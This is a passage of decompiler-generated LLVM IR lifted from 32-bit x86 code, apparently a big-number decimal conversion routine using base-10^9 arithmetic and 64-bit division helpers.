  %sext381 = phi i32 [ %sext, %dec_label_pc_8052b66 ], [ %sext374, %dec_label_pc_8052b6d.preheader ]
  %v3_8052b6d380 = phi i32 [ %v3_8052b6d, %dec_label_pc_8052b66 ], [ %v3_8052b6d373, %dec_label_pc_8052b6d.preheader ]
  %v0_8052ae8379 = phi i32 [ %v0_8052b6d.pre, %dec_label_pc_8052b66 ], [ %v2_8052a94, %dec_label_pc_8052b6d.preheader ]
  %v4_8052b6d = trunc i32 %v3_8052b6d380 to i8
  %v1_8052adc = sdiv i32 %sext381, 16777216
  %v7_8052adc = sub nsw i32 28, %v1_8052adc
  %v8_8052adc = and i32 %v7_8052adc, %v1_8052adc
  %v9_8052adc = icmp slt i32 %v8_8052adc, 0
  %tmp554 = icmp eq i32 %sext381, 486539264
  %v11_8052adc = icmp slt i8 %v4_8052b6d, 29
  %v3_8052ae1 = icmp ne i1 %v11_8052adc, %v9_8052adc
  %v4_8052ae1 = or i1 %tmp554, %v3_8052ae1
  %v1_8052adf. = select i1 %v4_8052ae1, i32 %v1_8052adc, i32 29
  store i32 %v1_8052adf., i32* @ebp, align 4
  %v1_8052ae8 = add i32 %v0_8052ae8379, 100
  %v2_8052ae8 = inttoptr i32 %v1_8052ae8 to i32*
  %v3_8052ae8 = load i32, i32* %v2_8052ae8, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052aee = add i32 %v3_8052ae8, -4
  store i32 %v1_8052aee, i32* @edi, align 4
  %v2_8052b36340 = add i32 %v0_8052ae8379, 96
  %v3_8052b36341 = inttoptr i32 %v2_8052b36340 to i32*
  %v4_8052b36342 = load i32, i32* %v3_8052b36341, align 4
  %v10_8052b36344 = icmp ult i32 %v1_8052aee, %v4_8052b36342
  %v1_8052b3a351 = icmp eq i1 %v10_8052b36344, false
  br i1 %v1_8052b3a351, label %dec_label_pc_8052af3, label %dec_label_pc_8052b3c.thread

dec_label_pc_8052b3c.thread:                      ; preds = %dec_label_pc_8052adc
  br label %dec_label_pc_8052b52.preheader

dec_label_pc_8052af3:                             ; preds = %dec_label_pc_8052adc, %dec_label_pc_8052b0b.dec_label_pc_8052af3_crit_edge
  %v0_8052af7 = phi i32 [ %v0_8052af7.pre, %dec_label_pc_8052b0b.dec_label_pc_8052af3_crit_edge ], [ %v1_8052adf., %dec_label_pc_8052adc ]
  %v0_8052af5354 = phi i32 [ %v0_8052b36.pre, %dec_label_pc_8052b0b.dec_label_pc_8052af3_crit_edge ], [ %v1_8052aee, %dec_label_pc_8052adc ]
  %v0_8052b0d353 = phi i32 [ %v1_8052b33, %dec_label_pc_8052b0b.dec_label_pc_8052af3_crit_edge ], [ %v0_8052ae8379, %dec_label_pc_8052adc ]
  %v0_8052b0b352 = phi i32 [ %v8_8052b2e, %dec_label_pc_8052b0b.dec_label_pc_8052af3_crit_edge ], [ 0, %dec_label_pc_8052adc ]
  store i32 %v0_8052b0b352, i32* %ebx.global-to-local, align 4
  %v1_8052af5 = inttoptr i32 %v0_8052af5354 to i32*
  %v2_8052af5 = load i32, i32* %v1_8052af5, align 4
  store i32 %v2_8052af5, i32* %eax.global-to-local, align 4
  store i32 %v0_8052af7, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v3_8052afd = urem i32 %v0_8052af7, 32
  %v6_8052afd = icmp eq i32 %v3_8052afd, 0
  br i1 %v6_8052afd, label %bb239, label %bb238

bb238:                                            ; preds = %dec_label_pc_8052af3
  %v8_8052afd = sub nsw i32 32, %v3_8052afd
  %v9_8052afd = lshr i32 %v2_8052af5, %v8_8052afd
  store i32 %v9_8052afd, i32* %edx.global-to-local, align 4
  br label %bb239

bb239:                                            ; preds = %dec_label_pc_8052af3, %bb238
  %v4_8052b00 = icmp eq i32 %v3_8052afd, 0
  br i1 %v4_8052b00, label %bb241, label %bb240

bb240:                                            ; preds = %bb239
  %v5_8052b00 = shl i32 %v2_8052af5, %v3_8052afd
  store i32 %v5_8052b00, i32* %eax.global-to-local, align 4
  br label %bb241

bb241:                                            ; preds = %bb239, %bb240
  %v0_8052b07 = phi i32 [ %v2_8052af5, %bb239 ], [ %v5_8052b00, %bb240 ]
  %v2_8052b02 = and i32 %v0_8052af7, 32
  %v3_8052b02 = icmp eq i32 %v2_8052b02, 0
  br i1 %v3_8052b02, label %dec_label_pc_8052b0b, label %dec_label_pc_8052b07

dec_label_pc_8052b07:                             ; preds = %bb241
  store i32 %v0_8052b07, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b0b

dec_label_pc_8052b0b:                             ; preds = %bb241, %dec_label_pc_8052b07
  %v1_8052b0b = phi i32 [ %v0_8052b07, %bb241 ], [ 0, %dec_label_pc_8052b07 ]
  %v2_8052b0b = add i32 %v1_8052b0b, %v0_8052b0b352
  %v7_8052b0b = icmp ult i32 %v2_8052b0b, %v0_8052b0b352
  store i32 %v2_8052b0b, i32* %ebx.global-to-local, align 4
  %v1_8052b0d = add i32 %v0_8052b0d353, -4
  %v2_8052b0d = inttoptr i32 %v1_8052b0d to i32*
  store i32 0, i32* %v2_8052b0d, align 4
  %v0_8052b0f = load i32, i32* %esi.global-to-local, align 4
  %v1_8052b0f = load i32, i32* %edx.global-to-local, align 4
  %v3_8052b0f = zext i1 %v7_8052b0b to i32
  %v4_8052b0f = add i32 %v1_8052b0f, %v0_8052b0f
  %v5_8052b0f = add i32 %v4_8052b0f, %v3_8052b0f
  store i32 %v5_8052b0f, i32* @esi, align 4
  %v1_8052b11 = add i32 %v0_8052b0d353, -8
  %v2_8052b11 = inttoptr i32 %v1_8052b11 to i32*
  store i32 1000000000, i32* %v2_8052b11, align 4
  %v0_8052b16 = load i32, i32* @esi, align 4
  %v2_8052b16 = add i32 %v0_8052b0d353, -12
  %v3_8052b16 = inttoptr i32 %v2_8052b16 to i32*
  store i32 %v0_8052b16, i32* %v3_8052b16, align 4
  %v0_8052b17 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052b17 = add i32 %v0_8052b0d353, -16
  %v3_8052b17 = inttoptr i32 %v2_8052b17 to i32*
  store i32 %v0_8052b17, i32* %v3_8052b17, align 4
  %v6_8052b18 = call i64 @__umoddi3(i64 %v6_8051df7, i64 %v5_8051ddc)
  %v7_8052b18 = trunc i64 %v6_8052b18 to i32
  store i32 %v7_8052b18, i32* %eax.global-to-local, align 4
  %v1_8052b20 = load i32, i32* @edi, align 4
  %v2_8052b20 = inttoptr i32 %v1_8052b20 to i32*
  store i32 %v7_8052b18, i32* %v2_8052b20, align 4
  %v0_8052b22 = load i32, i32* @edi, align 4
  %v1_8052b22 = add i32 %v0_8052b22, -4
  store i32 %v1_8052b22, i32* @edi, align 4
  %v0_8052b25 = load i32, i32* @esp, align 4
  %v1_8052b25 = add i32 %v0_8052b25, -4
  %v2_8052b25 = inttoptr i32 %v1_8052b25 to i32*
  store i32 0, i32* %v2_8052b25, align 4
  %v1_8052b27 = add i32 %v0_8052b25, -8
  %v2_8052b27 = inttoptr i32 %v1_8052b27 to i32*
  store i32 1000000000, i32* %v2_8052b27, align 4
  %v0_8052b2c = load i32, i32* @esi, align 4
  %v2_8052b2c = add i32 %v0_8052b25, -12
  %v3_8052b2c = inttoptr i32 %v2_8052b2c to i32*
  store i32 %v0_8052b2c, i32* %v3_8052b2c, align 4
  %v0_8052b2d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052b2d = add i32 %v0_8052b25, -16
  %v3_8052b2d = inttoptr i32 %v2_8052b2d to i32*
  store i32 %v0_8052b2d, i32* %v3_8052b2d, align 4
  %v6_8052b2e = call i64 @__udivdi3(i64 %v6_8051df7, i64 %v5_8051ddc)
  %v8_8052b2e = trunc i64 %v6_8052b2e to i32
  store i32 %v8_8052b2e, i32* %eax.global-to-local, align 4
  %v0_8052b33 = load i32, i32* @esp, align 4
  %v1_8052b33 = add i32 %v0_8052b33, 16
  %v0_8052b36.pre = load i32, i32* @edi, align 4
  %v2_8052b36 = add i32 %v0_8052b33, 112
  %v3_8052b36 = inttoptr i32 %v2_8052b36 to i32*
  %v4_8052b36 = load i32, i32* %v3_8052b36, align 4
  %v10_8052b36 = icmp ult i32 %v0_8052b36.pre, %v4_8052b36
  %v1_8052b3a = icmp eq i1 %v10_8052b36, false
  br i1 %v1_8052b3a, label %dec_label_pc_8052b0b.dec_label_pc_8052af3_crit_edge, label %dec_label_pc_8052b3c

dec_label_pc_8052b0b.dec_label_pc_8052af3_crit_edge: ; preds = %dec_label_pc_8052b0b
  %v0_8052af7.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8052af3

dec_label_pc_8052b3c:                             ; preds = %dec_label_pc_8052b0b
  %v1_8052b3c = icmp eq i32 %v8_8052b2e, 0
  br i1 %v1_8052b3c, label %dec_label_pc_8052b52.preheader, label %dec_label_pc_8052b40

dec_label_pc_8052b40:                             ; preds = %dec_label_pc_8052b3c
  %v4_8052b40 = add i32 %v4_8052b36, -4
  store i32 %v4_8052b40, i32* %v3_8052b36, align 4
  %v0_8052b45 = load i32, i32* @esp, align 4
  %v1_8052b45 = add i32 %v0_8052b45, 96
  %v2_8052b45 = inttoptr i32 %v1_8052b45 to i32*
  %v3_8052b45 = load i32, i32* %v2_8052b45, align 4
  store i32 %v3_8052b45, i32* %ebx.global-to-local, align 4
  %v0_8052b49 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b49 = inttoptr i32 %v3_8052b45 to i32*
  store i32 %v0_8052b49, i32* %v2_8052b49, align 4
  %v0_8052b52358.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052b52.preheader

dec_label_pc_8052b52.preheader:                   ; preds = %dec_label_pc_8052b3c.thread, %dec_label_pc_8052b40, %dec_label_pc_8052b3c
  %v0_8052b52358 = phi i32 [ %v0_8052b52358.pre, %dec_label_pc_8052b40 ], [ %v1_8052b33, %dec_label_pc_8052b3c ], [ %v0_8052ae8379, %dec_label_pc_8052b3c.thread ]
  %v1_8052b52359 = add i32 %v0_8052b52358, 96
  %v2_8052b52360 = inttoptr i32 %v1_8052b52359 to i32*
  %v3_8052b52361 = load i32, i32* %v2_8052b52360, align 4
  store i32 %v3_8052b52361, i32* %esi.global-to-local, align 4
  %v1_8052b56362 = add i32 %v0_8052b52358, 100
  %v2_8052b56363 = inttoptr i32 %v1_8052b56362 to i32*
  %v3_8052b56364 = load i32, i32* %v2_8052b56363, align 4
  %tmp242365 = icmp ugt i32 %v3_8052b56364, %v3_8052b52361
  br i1 %tmp242365, label %dec_label_pc_8052b5c, label %dec_label_pc_8052b66

dec_label_pc_8052b4d:                             ; preds = %dec_label_pc_8052b5c
  %v3_8052b4d = load i32, i32* %v2_8052b56367, align 4
  %v4_8052b4d = add i32 %v3_8052b4d, -4
  store i32 %v4_8052b4d, i32* %v2_8052b56367, align 4
  %v0_8052b52 = load i32, i32* @esp, align 4
  %v1_8052b52 = add i32 %v0_8052b52, 96
  %v2_8052b52 = inttoptr i32 %v1_8052b52 to i32*
  %v3_8052b52 = load i32, i32* %v2_8052b52, align 4
  store i32 %v3_8052b52, i32* %esi.global-to-local, align 4
  %v1_8052b56 = add i32 %v0_8052b52, 100
  %v2_8052b56 = inttoptr i32 %v1_8052b56 to i32*
  %v3_8052b56 = load i32, i32* %v2_8052b56, align 4
  %tmp242 = icmp ugt i32 %v3_8052b56, %v3_8052b52
  br i1 %tmp242, label %dec_label_pc_8052b5c, label %dec_label_pc_8052b66

dec_label_pc_8052b5c:                             ; preds = %dec_label_pc_8052b52.preheader, %dec_label_pc_8052b4d
  %v3_8052b56368 = phi i32 [ %v3_8052b56, %dec_label_pc_8052b4d ], [ %v3_8052b56364, %dec_label_pc_8052b52.preheader ]
  %v2_8052b56367 = phi i32* [ %v2_8052b56, %dec_label_pc_8052b4d ], [ %v2_8052b56363, %dec_label_pc_8052b52.preheader ]
  %v0_8052b52366 = phi i32 [ %v0_8052b52, %dec_label_pc_8052b4d ], [ %v0_8052b52358, %dec_label_pc_8052b52.preheader ]
  store i32 %v3_8052b56368, i32* %eax.global-to-local, align 4
  %v1_8052b60 = add i32 %v3_8052b56368, -4
  %v2_8052b60 = inttoptr i32 %v1_8052b60 to i32*
  %v3_8052b60 = load i32, i32* %v2_8052b60, align 4
  %v4_8052b60 = icmp eq i32 %v3_8052b60, 0
  br i1 %v4_8052b60, label %dec_label_pc_8052b4d, label %dec_label_pc_8052b66

dec_label_pc_8052b66:                             ; preds = %dec_label_pc_8052b5c, %dec_label_pc_8052b4d, %dec_label_pc_8052b52.preheader
  %v0_8052b52.lcssa = phi i32 [ %v0_8052b52358, %dec_label_pc_8052b52.preheader ], [ %v0_8052b52, %dec_label_pc_8052b4d ], [ %v0_8052b52366, %dec_label_pc_8052b5c ]
  %v1_8052b66 = add i32 %v0_8052b52.lcssa, 7828
  %v2_8052b66 = inttoptr i32 %v1_8052b66 to i32*
  %v3_8052b66 = load i32, i32* %v2_8052b66, align 4
  %v4_8052b66 = load i32, i32* @ebp, align 4
  %v5_8052b66 = sub i32 %v3_8052b66, %v4_8052b66
  store i32 %v5_8052b66, i32* %v2_8052b66, align 4
  %v0_8052b6d.pre = load i32, i32* @esp, align 4
  %v1_8052b6d = add i32 %v0_8052b6d.pre, 7828
  %v2_8052b6d = inttoptr i32 %v1_8052b6d to i32*
  %v3_8052b6d = load i32, i32* %v2_8052b6d, align 4
  store i32 %v3_8052b6d, i32* %ecx.global-to-local, align 4
  %sext = mul i32 %v3_8052b6d, 16777216
  %tmp243 = icmp slt i32 %sext, 1
  %tmp244 = icmp eq i1 %tmp243, false
  br i1 %tmp244, label %dec_label_pc_8052adc, label %dec_label_pc_8052b7c

dec_label_pc_8052b7c:                             ; preds = %dec_label_pc_8052b66, %dec_label_pc_8052b6d.preheader
  %v0_8052ae8.lcssa = phi i32 [ %v2_8052a94, %dec_label_pc_8052b6d.preheader ], [ %v0_8052b6d.pre, %dec_label_pc_8052b66 ]
  %v1_8052b7c = add i32 %v0_8052ae8.lcssa, 52
  %v2_8052b7c = inttoptr i32 %v1_8052b7c to i32*
  %v3_8052b7c = load i32, i32* %v2_8052b7c, align 4
  store i32 9, i32* %ecx.global-to-local, align 4
  %v1_8052b87 = add i32 %v3_8052b7c, 29
  %v1_8052b8a = ashr i32 %v1_8052b87, 31
  %v2_8052b8b = zext i32 %v1_8052b87 to i64
  %v4_8052b8b = zext i32 %v1_8052b8a to i64
  %v5_8052b8b = mul nuw i64 %v4_8052b8b, 4294967296
  %v6_8052b8b = or i64 %v5_8052b8b, %v2_8052b8b
  %v8_8052b8b = sdiv i64 %v6_8052b8b, 9
  %v9_8052b8b = trunc i64 %v8_8052b8b to i32
  store i32 %v9_8052b8b, i32* %eax.global-to-local, align 4
  %v10_8052b8b = srem i64 %v6_8052b8b, 9
  %v11_8052b8b = trunc i64 %v10_8052b8b to i32
  store i32 %v11_8052b8b, i32* %edx.global-to-local, align 4
  %v1_8052b8d = add i32 %v9_8052b8b, 1
  store i32 %v1_8052b8d, i32* %ebp.global-to-local, align 4
  %v1_8052b90 = mul i32 %v1_8052b8d, 4
  store i32 %v1_8052b90, i32* %ebx.global-to-local, align 4
  %v2_8052b97 = add i32 %v0_8052ae8.lcssa, 88
  %v3_8052b97 = inttoptr i32 %v2_8052b97 to i32*
  store i32 %v1_8052b90, i32* %v3_8052b97, align 4
  %v0_8052c4271 = load i32, i32* @esp, align 4
  %v1_8052c4272 = add i32 %v0_8052c4271, 7828
  %v2_8052c4273 = inttoptr i32 %v1_8052c4272 to i32*
  %v3_8052c4274 = load i32, i32* %v2_8052c4273, align 4
  store i32 %v3_8052c4274, i32* %eax.global-to-local, align 4
  %v2_8052c4976 = icmp slt i32 %v3_8052c4274, 0
  br i1 %v2_8052c4976, label %dec_label_pc_8052ba0, label %dec_label_pc_8052c51

dec_label_pc_8052ba0:                             ; preds = %dec_label_pc_8052b7c, %dec_label_pc_8052c3b
  %v1_8052bbd = phi i32 [ %v0_8052c42, %dec_label_pc_8052c3b ], [ %v0_8052c4271, %dec_label_pc_8052b7c ]
  %v0_8052ba0 = phi i32 [ %v3_8052c42, %dec_label_pc_8052c3b ], [ %v3_8052c4274, %dec_label_pc_8052b7c ]
  %v1_8052ba2 = sub i32 0, %v0_8052ba0
  %v1_8052ba4 = sub i32 -9, %v0_8052ba0
  %v6_8052ba4 = add i32 %v0_8052ba0, 8
  %v7_8052ba4 = and i32 %v6_8052ba4, %v1_8052ba2
  %v8_8052ba4 = icmp slt i32 %v7_8052ba4, 0
  %v9_8052ba4 = icmp eq i32 %v1_8052ba4, 0
  %v10_8052ba4 = icmp slt i32 %v1_8052ba4, 0
  %v3_8052ba7 = icmp ne i1 %v10_8052ba4, %v8_8052ba4
  %v4_8052ba7 = or i1 %v9_8052ba4, %v3_8052ba7
  %v1_8052ba2. = select i1 %v4_8052ba7, i32 %v1_8052ba2, i32 9
  store i32 %v1_8052ba2., i32* %esi.global-to-local, align 4
  %v1_8052bae = add i32 %v1_8052bbd, 96
  %v2_8052bae = inttoptr i32 %v1_8052bae to i32*
  %v3_8052bae = load i32, i32* %v2_8052bae, align 4
  store i32 %v3_8052bae, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edi.global-to-local, align 4
  store i32 %v1_8052ba2., i32* %ecx.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_8052bbb = urem i32 %v1_8052ba2., 32
  %v4_8052bbb = icmp eq i32 %v2_8052bbb, 0
  br i1 %v4_8052bbb, label %bb246, label %bb245

bb245:                                            ; preds = %dec_label_pc_8052ba0
  %v5_8052bbb = shl i32 1, %v2_8052bbb
  store i32 %v5_8052bbb, i32* %edi.global-to-local, align 4
  br label %bb246

bb246:                                            ; preds = %dec_label_pc_8052ba0, %bb245
  %v2_8052bbd = add i32 %v1_8052bbd, 24
  %v3_8052bbd = inttoptr i32 %v2_8052bbd to i32*
  store i32 %v3_8052bae, i32* %v3_8052bbd, align 4
  %v0_8052bec383 = load i32, i32* @esp, align 4
  %v1_8052bec384 = add i32 %v0_8052bec383, 100
  %v2_8052bec385 = inttoptr i32 %v1_8052bec384 to i32*
  %v3_8052bec386 = load i32, i32* %v2_8052bec385, align 4
  store i32 %v3_8052bec386, i32* %eax.global-to-local, align 4
  %v1_8052bf0387 = add i32 %v0_8052bec383, 24
  %v2_8052bf0388 = inttoptr i32 %v1_8052bf0387 to i32*
  %v3_8052bf0389 = load i32, i32* %v2_8052bf0388, align 4
  %v10_8052bf0390 = icmp ult i32 %v3_8052bf0389, %v3_8052bec386
  br i1 %v10_8052bf0390, label %dec_label_pc_8052bc3.lr.ph, label %dec_label_pc_8052bf6

dec_label_pc_8052bc3.lr.ph:                       ; preds = %bb246
  %v0_8052bcf.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052bc3

dec_label_pc_8052bc3:                             ; preds = %dec_label_pc_8052bc3.lr.ph, %bb248
  %v0_8052bcf = phi i32 [ %v0_8052bcf.pre, %dec_label_pc_8052bc3.lr.ph ], [ %v4_8052be9, %bb248 ]
  %v3_8052bf0392 = phi i32 [ %v3_8052bf0389, %dec_label_pc_8052bc3.lr.ph ], [ %v3_8052bf0, %bb248 ]
  %v2_8052bf0391 = phi i32* [ %v2_8052bf0388, %dec_label_pc_8052bc3.lr.ph ], [ %v2_8052bf0, %bb248 ]
  store i32 %v3_8052bf0392, i32* %edx.global-to-local, align 4
  %v0_8052bc7 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8052bc7, i32* %ecx.global-to-local, align 4
  %v1_8052bc9 = inttoptr i32 %v3_8052bf0392 to i32*
  %v2_8052bc9 = load i32, i32* %v1_8052bc9, align 4
  store i32 %v2_8052bc9, i32* %eax.global-to-local, align 4
  %v2_8052bcd = urem i32 %v0_8052bc7, 32
  %v5_8052bcd = lshr i32 %v2_8052bc9, %v2_8052bcd
  %v2_8052bcf = add i32 %v0_8052bcf, %v5_8052bcd
  store i32 %v2_8052bcf, i32* %edx.global-to-local, align 4
  %v3_8052bd2 = load i32, i32* %v2_8052bf0391, align 4
  store i32 %v3_8052bd2, i32* %ebx.global-to-local, align 4
  %v3_8052bd6 = load i32, i32* %v2_8052bf0391, align 4
  %v4_8052bd6 = add i32 %v3_8052bd6, 4
  store i32 %v4_8052bd6, i32* %v2_8052bf0391, align 4
  %v0_8052bdb = load i32, i32* %edx.global-to-local, align 4
  %v1_8052bdb = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052bdb = inttoptr i32 %v1_8052bdb to i32*
  store i32 %v0_8052bdb, i32* %v2_8052bdb, align 4
  %v0_8052bdd = load i32, i32* %edi.global-to-local, align 4
  %v1_8052bdd = add i32 %v0_8052bdd, -1
  %v1_8052be0 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052be0 = and i32 %v1_8052be0, %v1_8052bdd
  store i32 %v2_8052be0, i32* %ebx.global-to-local, align 4
  store i32 1000000000, i32* %eax.global-to-local, align 4
  %v1_8052be7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052be7 = urem i32 %v1_8052be7, 32
  %v4_8052be7 = icmp eq i32 %v2_8052be7, 0
  br i1 %v4_8052be7, label %bb248, label %bb247

bb247:                                            ; preds = %dec_label_pc_8052bc3
  %v5_8052be7 = lshr i32 1000000000, %v2_8052be7
  store i32 %v5_8052be7, i32* %eax.global-to-local, align 4
  br label %bb248

bb248:                                            ; preds = %dec_label_pc_8052bc3, %bb247
  %v1_8052be9 = phi i32 [ 1000000000, %dec_label_pc_8052bc3 ], [ %v5_8052be7, %bb247 ]
  %v4_8052be9 = mul i32 %v1_8052be9, %v2_8052be0
  store i32 %v4_8052be9, i32* %ebx.global-to-local, align 4
  %v0_8052bec = load i32, i32* @esp, align 4
  %v1_8052bec = add i32 %v0_8052bec, 100
  %v2_8052bec = inttoptr i32 %v1_8052bec to i32*
  %v3_8052bec = load i32, i32* %v2_8052bec, align 4
  store i32 %v3_8052bec, i32* %eax.global-to-local, align 4
  %v1_8052bf0 = add i32 %v0_8052bec, 24
  %v2_8052bf0 = inttoptr i32 %v1_8052bf0 to i32*
  %v3_8052bf0 = load i32, i32* %v2_8052bf0, align 4
  %v10_8052bf0 = icmp ult i32 %v3_8052bf0, %v3_8052bec
  br i1 %v10_8052bf0, label %dec_label_pc_8052bc3, label %dec_label_pc_8052bf6

dec_label_pc_8052bf6:                             ; preds = %bb248, %bb246
  %v0_8052bec.lcssa = phi i32 [ %v0_8052bec383, %bb246 ], [ %v0_8052bec, %bb248 ]
  %v1_8052bf6 = add i32 %v0_8052bec.lcssa, 96
  %v2_8052bf6 = inttoptr i32 %v1_8052bf6 to i32*
  %v3_8052bf6 = load i32, i32* %v2_8052bf6, align 4
  store i32 %v3_8052bf6, i32* %edx.global-to-local, align 4
  %v1_8052bfa = inttoptr i32 %v3_8052bf6 to i32*
  %v2_8052bfa = load i32, i32* %v1_8052bfa, align 4
  %v3_8052bfa = icmp eq i32 %v2_8052bfa, 0
  %v1_8052bfd = icmp eq i1 %v3_8052bfa, false
  br i1 %v1_8052bfd, label %dec_label_pc_8052c06, label %dec_label_pc_8052bff

dec_label_pc_8052bff:                             ; preds = %dec_label_pc_8052bf6
  %v1_8052bff = add i32 %v3_8052bf6, 4
  store i32 %v1_8052bff, i32* %edx.global-to-local, align 4
  store i32 %v1_8052bff, i32* %v2_8052bf6, align 4
  br label %dec_label_pc_8052c06

dec_label_pc_8052c06:                             ; preds = %dec_label_pc_8052bf6, %dec_label_pc_8052bff
  %v0_8052c06 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052c06 = icmp eq i32 %v0_8052c06, 0
  br i1 %v1_8052c06, label %dec_label_pc_8052c17, label %dec_label_pc_8052c0a

dec_label_pc_8052c0a:                             ; preds = %dec_label_pc_8052c06
  %v0_8052c0a = load i32, i32* @esp, align 4
  %v1_8052c0a = add i32 %v0_8052c0a, 100
  %v2_8052c0a = inttoptr i32 %v1_8052c0a to i32*
  %v3_8052c0a = load i32, i32* %v2_8052c0a, align 4
  store i32 %v3_8052c0a, i32* %ecx.global-to-local, align 4
  %v2_8052c0e = inttoptr i32 %v3_8052c0a to i32*
  store i32 %v0_8052c06, i32* %v2_8052c0e, align 4
  %v0_8052c10 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052c10 = add i32 %v0_8052c10, 4
  store i32 %v1_8052c10, i32* %ecx.global-to-local, align 4
  %v1_8052c13 = load i32, i32* @esp, align 4
  %v2_8052c13 = add i32 %v1_8052c13, 100
  %v3_8052c13 = inttoptr i32 %v2_8052c13 to i32*
  store i32 %v1_8052c10, i32* %v3_8052c13, align 4
  br label %dec_label_pc_8052c17

dec_label_pc_8052c17:                             ; preds = %dec_label_pc_8052c06, %dec_label_pc_8052c0a
  %v0_8052c17 = load i32, i32* @esp, align 4
  %v1_8052c17 = add i32 %v0_8052c17, 92
  %v2_8052c17 = inttoptr i32 %v1_8052c17 to i32*
  %v3_8052c17 = load i32, i32* %v2_8052c17, align 4
  %v12_8052c17 = icmp eq i32 %v3_8052c17, 102
  %v1_8052c1c = add i32 %v0_8052c17, 104
  %v2_8052c1c = inttoptr i32 %v1_8052c1c to i32*
  %v3_8052c1c = load i32, i32* %v2_8052c1c, align 4
  store i32 %v3_8052c1c, i32* %edx.global-to-local, align 4
  br i1 %v12_8052c17, label %dec_label_pc_8052c26, label %dec_label_pc_8052c22

dec_label_pc_8052c22:                             ; preds = %dec_label_pc_8052c17
  %v1_8052c22 = add i32 %v0_8052c17, 96
  %v2_8052c22 = inttoptr i32 %v1_8052c22 to i32*
  %v3_8052c22 = load i32, i32* %v2_8052c22, align 4
  store i32 %v3_8052c22, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052c26

dec_label_pc_8052c26:                             ; preds = %dec_label_pc_8052c17, %dec_label_pc_8052c22
  %v0_8052c33 = phi i32 [ %v3_8052c1c, %dec_label_pc_8052c17 ], [ %v3_8052c22, %dec_label_pc_8052c22 ]
  %v1_8052c26 = add i32 %v0_8052c17, 100
  %v2_8052c26 = inttoptr i32 %v1_8052c26 to i32*
  %v3_8052c26 = load i32, i32* %v2_8052c26, align 4
  %v2_8052c2a = sub i32 %v3_8052c26, %v0_8052c33
  %v2_8052c2c = sdiv i32 %v2_8052c2a, 4
  store i32 %v2_8052c2c, i32* %eax.global-to-local, align 4
  %v1_8052c2f = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052c2f = sub i32 %v2_8052c2c, %v1_8052c2f
  %v8_8052c2f = xor i32 %v1_8052c2f, %v2_8052c2c
  %v9_8052c2f = xor i32 %v2_8052c2f, %v2_8052c2c
  %v10_8052c2f = and i32 %v9_8052c2f, %v8_8052c2f
  %v11_8052c2f = icmp slt i32 %v10_8052c2f, 0
  %v12_8052c2f = icmp eq i32 %v2_8052c2f, 0
  %v13_8052c2f = icmp slt i32 %v2_8052c2f, 0
  %v3_8052c31 = icmp ne i1 %v13_8052c2f, %v11_8052c2f
  %v4_8052c31 = or i1 %v12_8052c2f, %v3_8052c31
  br i1 %v4_8052c31, label %dec_label_pc_8052c3b, label %dec_label_pc_8052c33

dec_label_pc_8052c33:                             ; preds = %dec_label_pc_8052c26
  %v2_8052c33 = add i32 %v0_8052c17, 88
  %v3_8052c33 = inttoptr i32 %v2_8052c33 to i32*
  %v4_8052c33 = load i32, i32* %v3_8052c33, align 4
  %v5_8052c33 = add i32 %v4_8052c33, %v0_8052c33
  store i32 %v5_8052c33, i32* %edx.global-to-local, align 4
  store i32 %v5_8052c33, i32* %v2_8052c26, align 4
  %v0_8052c3b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052c3b

dec_label_pc_8052c3b:                             ; preds = %dec_label_pc_8052c26, %dec_label_pc_8052c33
  %v0_8052c3b = phi i32 [ %v0_8052c17, %dec_label_pc_8052c26 ], [ %v0_8052c3b.pre, %dec_label_pc_8052c33 ]
  %v1_8052c3b = add i32 %v0_8052c3b, 7828
  %v2_8052c3b = inttoptr i32 %v1_8052c3b to i32*
  %v3_8052c3b = load i32, i32* %v2_8052c3b, align 4
  %v4_8052c3b = load i32, i32* %esi.global-to-local, align 4
  %v5_8052c3b = add i32 %v4_8052c3b, %v3_8052c3b
  store i32 %v5_8052c3b, i32* %v2_8052c3b, align 4
  %v0_8052c42 = load i32, i32* @esp, align 4
  %v1_8052c42 = add i32 %v0_8052c42, 7828
  %v2_8052c42 = inttoptr i32 %v1_8052c42 to i32*
  %v3_8052c42 = load i32, i32* %v2_8052c42, align 4
  store i32 %v3_8052c42, i32* %eax.global-to-local, align 4
  %v2_8052c49 = icmp slt i32 %v3_8052c42, 0
  br i1 %v2_8052c49, label %dec_label_pc_8052ba0, label %dec_label_pc_8052c42.dec_label_pc_8052c51_crit_edge

dec_label_pc_8052c42.dec_label_pc_8052c51_crit_edge: ; preds = %dec_label_pc_8052c3b
  br label %dec_label_pc_8052c51

dec_label_pc_8052c51:                             ; preds = %dec_label_pc_8052c42.dec_label_pc_8052c51_crit_edge, %dec_label_pc_8052b7c
  %v0_8052ca9 = phi i32 [ %v0_8052c42, %dec_label_pc_8052c42.dec_label_pc_8052c51_crit_edge ], [ %v0_8052c4271, %dec_label_pc_8052b7c ]
  %v1_8052c51 = add i32 %v0_8052ca9, 100
  %v2_8052c51 = inttoptr i32 %v1_8052c51 to i32*
  %v3_8052c51 = load i32, i32* %v2_8052c51, align 4
  store i32 %v3_8052c51, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_8052c57 = add i32 %v0_8052ca9, 96
  %v2_8052c57 = inttoptr i32 %v1_8052c57 to i32*
  %v3_8052c57 = load i32, i32* %v2_8052c57, align 4
